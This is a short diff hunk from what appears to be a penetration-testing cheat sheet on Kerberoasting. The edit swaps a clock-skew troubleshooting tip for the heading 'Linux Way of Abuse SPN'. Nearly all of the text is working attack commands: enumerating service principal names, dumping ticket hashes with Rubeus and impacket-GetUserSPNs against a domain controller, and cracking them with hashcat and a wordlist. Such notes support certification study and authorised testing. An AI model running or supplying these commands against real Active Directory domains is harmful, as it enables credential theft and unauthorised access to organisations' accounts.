@@ -378,7 +378,7 @@ setspn -Q */*
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
 ```
->If impacket-GetUserSPNs throws the error "KRB_AP_ERR_SKEW(Clock skew too great)," we need to synchronize the time of the Kali machine with the domain controller. We can use ntpdate or rdate to do so.
+>Linux Way of Abuse SPN
 ```
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 domain/username:pass -outputfile <output_TGSs_file>
 ```
